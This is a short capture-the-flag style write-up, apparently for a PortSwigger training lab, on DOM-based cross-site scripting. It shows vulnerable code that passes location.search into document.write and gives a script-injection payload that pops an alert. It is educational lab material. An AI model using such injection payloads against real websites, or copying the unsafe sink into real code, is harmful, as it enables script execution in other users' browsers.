
# DOM XSS in document.write sink using source location.search

This lab contains a DOM-based cross-site scripting vulnerability in the search query tracking functionality. It uses the JavaScript document.write function, which writes data out to the page. The document.write function is called with data from location.search, which you can control using the website URL.

To solve this lab, perform a cross-site scripting attack that calls the alert function.

---------------------------------------------

References:

- https://portswigger.net/web-security/cross-site-scripting/dom-based

---------------------------------------------


There is a search function in "/?search=":



![img](images/DOM%20XSS%20in%20document.write%20sink%20using%20source%20location.search/1.png)

In the source code we see the sink:

```
function trackSearch(query) {
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
}
var query = (new URLSearchParams(window.location.search)).get('search');
if(query) {
    trackSearch(query);
}
```



![img](images/DOM%20XSS%20in%20document.write%20sink%20using%20source%20location.search/2.png)

We can pop an alert with the payload:

```
"><script>alert(1)</script>
```




![img](images/DOM%20XSS%20in%20document.write%20sink%20using%20source%20location.search/3.png)